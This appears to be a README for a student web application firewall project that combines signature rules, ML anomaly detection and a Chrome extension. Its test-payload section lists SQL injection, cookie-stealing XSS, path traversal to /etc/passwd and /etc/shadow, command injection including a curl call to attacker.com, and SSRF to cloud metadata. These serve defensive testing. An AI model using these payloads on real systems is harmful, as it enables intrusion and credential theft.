# ⚡ WAFinity — Hybrid AI Web Application Firewall

> **BTech CSE Cyber Security Major Project**  
> A real-time Web Application Firewall combining signature-based detection, machine learning anomaly detection, and a live Chrome extension for browser-level protection.

---

## Architecture

```
 Chrome Browser
      │
      │  every URL request
      ▼
 ┌──────────────────┐        POST /check_request
 │  WAFinity        │ ──────────────────────────────► ┌─────────────────────┐
 │  Chrome Extension│                                  │  WAFinity Backend   │
 │  (background.js) │ ◄──────────────────────────────  │  Flask :5000        │
 └──────────────────┘    {status, attack_type,         │                     │
      │                   severity, score}             │  ┌───────────────┐  │
      │ notification                                   │  │ Signature     │  │
      ▼                                                │  │ Checker       │  │
 🚨 Alert popup                                        │  ├───────────────┤  │
                                                       │  │ Bypass Det.   │  │
                                                       │  ├───────────────┤  │
                                                       │  │ AI Anomaly    │  │
                                                       │  │ (IsoForest)   │  │
                                                       │  ├───────────────┤  │
                                                       │  │ ML Classifier │  │
                                                       │  │ (RandomForest)│  │
                                                       │  ├───────────────┤  │
                                                       │  │ Behavior      │  │
                                                       │  │ Tracker       │  │
                                                       │  ├───────────────┤  │
                                                       │  │ Online        │  │
                                                       │  │ Learning      │  │
                                                       │  └───────────────┘  │
                                                       └─────────────────────┘
```

---

## Detection Layers

| Layer | Module | Detects |
|---|---|---|
| **1. Signature** | `signature_checker.py` | SQL Injection, XSS, Path Traversal, Command Injection, SSRF |
| **2. Bypass Detection** | `bypass_detector.py` | Obfuscated WAF bypass attempts |
| **3. Threat Intel** | `threat_feed.py` | Known malicious IPs, scanning tools (sqlmap, nmap…) |
| **4. AI Anomaly** | `anomaly_detector.py` | Isolation Forest — zero-day / unusual patterns |
| **5. ML Classifier** | `ml_checker.py` | Random Forest — obfuscated payloads |
| **6. Behavior Tracking** | `behavior_tracker.py` | Per-IP malicious request ratio |
| **7. Online Learning** | `online_learning.py` | Remembers and re-detects past attack patterns |
| **8. Adaptive Rules** | `adaptive_rules.py` | Auto-generates rules from attack payloads |

---

## Quick Start

### Step 1 — Start the Backend

**Windows:**
```
cd Advanced-WAF-WAFinity-main
setup.bat
```

**Linux / Mac:**
```bash
cd Advanced-WAF-WAFinity-main
chmod +x setup.sh && ./setup.sh
```

**Manual:**
```bash
cd Advanced-WAF-WAFinity-main
pip install -r requirements.txt
python app.py
```

Backend will start at **http://127.0.0.1:5000**

### Step 2 — Load the Chrome Extension

1. Open **chrome://extensions**
2. Enable **Developer mode** (top right toggle)
3. Click **Load unpacked**
4. Select the `Wafy-Extension` folder
5. The WAFinity shield icon appears in your toolbar

### Step 3 — Open the Live Dashboard

Navigate to: **http://127.0.0.1:5000/stats**

---

## API Reference

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/` | Service info |
| `GET` | `/health` | Health check |
| `POST` | `/check_request` | Analyse a payload |
| `GET` | `/stats_data` | Attack statistics (JSON) |
| `GET` | `/live_attacks` | Last 50 attacks |
| `GET` | `/recent_attacks` | Last 10 attacks (extension) |
| `GET` | `/attack_clusters` | DBSCAN clusters |
| `GET` | `/stats` | Live HTML dashboard |

### POST /check_request

**Request:**
```json
{ "user_request": "<payload or URL to test>" }
```

**Response (malicious):**
```json
{
  "status": "malicious",
  "attack_type": "SQL Injection",
  "severity": "HIGH",
  "threat_score": 90,
  "explanation": "This payload attempts to manipulate database queries...",
  "message": "Malicious payload detected 🚨"
}
```

**Response (safe):**
```json
{ "status": "valid", "message": "Safe ✅" }
```

---

## Test Payloads

### SQL Injection
```
' OR '1'='1'; DROP TABLE users;--
1' UNION SELECT username,password FROM users--
admin'--
```

### XSS
```
<script>alert('XSS')</script>
<img src=x onerror=alert(document.cookie)>
javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

### Path Traversal
```
../../../../etc/passwd
..%2F..%2F..%2Fetc%2Fshadow
```

### Command Injection
```
; cat /etc/passwd
| whoami
`id`
$(curl http://attacker.com)
```

### SSRF
```
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
```

### Obfuscated (ML layer)
```
%27%20OR%20%271%27%3D%271
\x27\x20OR\x20\x31\x3D\x31
```

---

## Project Structure

```
Advanced-WAF-WAFinity-main/
├── app.py                          # Flask entry point
├── requirements.txt
├── setup.bat / setup.sh
├── templates/
│   └── dashboard.html              # Live security dashboard
├── models/
│   └── anomaly_model.pkl           # Pre-trained Isolation Forest
├── logs/
│   ├── access.log
│   ├── attack.log
│   ├── blocked_ips.log
│   └── system.log
└── src/hybrid_waf/
    ├── core/
    │   └── normalizer.py           # Double URL-decode + HTML unescape
    ├── ai/
    │   ├── anomaly_detector.py     # Isolation Forest
    │   ├── attack_clusterer.py     # DBSCAN clustering
    │   ├── attack_explainer.py     # Human-readable explanations
    │   ├── adaptive_rules.py       # Auto-generated rules
    │   ├── auto_defense.py         # block/monitor/allow decision
    │   ├── behavior_tracker.py     # Per-IP malicious ratio
    │   ├── feature_extractor.py    # 5-feature vector for anomaly model
    │   ├── feedback_loop.py        # Store detection results
    │   └── online_learning.py      # Pattern memory
    ├── intel/
    │   └── threat_feed.py          # Bad IPs + known tool signatures
    ├── models/
    │   └── ml_model.pkl            # Pre-trained Random Forest
    ├── routes/
    │   ├── main.py                 # Health + root routes
    │   └── proxy.py                # Core /check_request logic
    └── utils/
        ├── attack_stats.py         # Request/attack counters
        ├── bypass_detector.py      # WAF evasion detection
        ├── ip_blocker.py           # In-memory IP blocking
        ├── logging_manager.py      # Structured JSON logging
        ├── ml_checker.py           # ML prediction wrapper
        ├── preprocessor.py         # 8-feature vector for ML model
        ├── signature_checker.py    # Regex pattern matching
        └── threat_scoring.py       # 0-100 threat score

Wafy-Extension/
├── manifest.json                   # MV3 Chrome extension config
├── background.js                   # Service worker — intercepts requests
├── popup.html                      # Extension popup UI
├── popup.js                        # Popup logic
└── icons/
    ├── icon16.png
    ├── icon48.png
    └── icon128.png
```

---

## Tech Stack

- **Backend:** Python 3.8+, Flask, Flask-CORS
- **ML:** scikit-learn (Isolation Forest + Random Forest)
- **Extension:** Chrome MV3 (Manifest V3), Vanilla JS
- **Logging:** Structured JSON logs

---

## License

MIT — Free to use for academic and educational purposes.
